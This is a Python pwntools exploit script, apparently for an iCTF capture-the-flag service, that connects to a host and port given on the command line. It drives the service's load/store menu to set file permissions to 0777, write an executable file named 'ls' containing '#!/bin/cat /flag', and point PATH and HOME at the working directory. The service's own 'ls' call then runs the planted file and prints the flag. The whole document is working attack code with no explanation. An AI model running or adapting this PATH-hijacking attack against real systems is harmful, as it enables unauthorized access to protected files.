import pwn
import sys
import re

pwn.context.log_level = 'debug'

conn = pwn.remote(sys.argv[1], sys.argv[2])

conn.recvuntil(b"ID is ")
localdir = conn.recvline().strip()
print("Using local dir [%s]" % localdir)
conn.recvuntil(b"quit):")
conn.sendline(b"load")
conn.recvuntil(b"variable:")
conn.sendline(b"permissions")
conn.recvuntil(b"value:")
conn.sendline(b"0777")
conn.recvuntil(b"quit):")
conn.sendline(b"store")
conn.recvuntil(b"variable:")
conn.sendline(b"permissions")
conn.recvuntil(b"quit):")
conn.sendline(b"load")
conn.recvuntil(b"variable:")
conn.sendline(b"HOME")
conn.recvuntil(b"value:")
conn.sendline(b"./")

conn.recvuntil(b"quit):")
conn.sendline(b"load")
conn.recvuntil(b"variable:")
conn.sendline(b"ls")
conn.recvuntil(b"value:")
conn.sendline(b"#!/bin/cat /flag")
conn.recvuntil(b"quit):")
conn.sendline(b"store")
conn.recvuntil(b"variable:")
conn.sendline(b"ls")

conn.recvuntil(b"quit):")
conn.sendline(b"load")
conn.recvuntil(b"variable:")
conn.sendline(b"PATH")
conn.recvuntil(b"value:")
conn.sendline(b".")

conn.recvuntil(b"quit):")
conn.sendline(b"quit")

complete_output = ""
while True:
	try:
		output = str(conn.recv())
	except:
		break
	if not output:
		break
	complete_output += output
	
print(complete_output)	
#m = re.search("ictf\{([^\]]+)\}", complete_output)
#print(m.group(1))




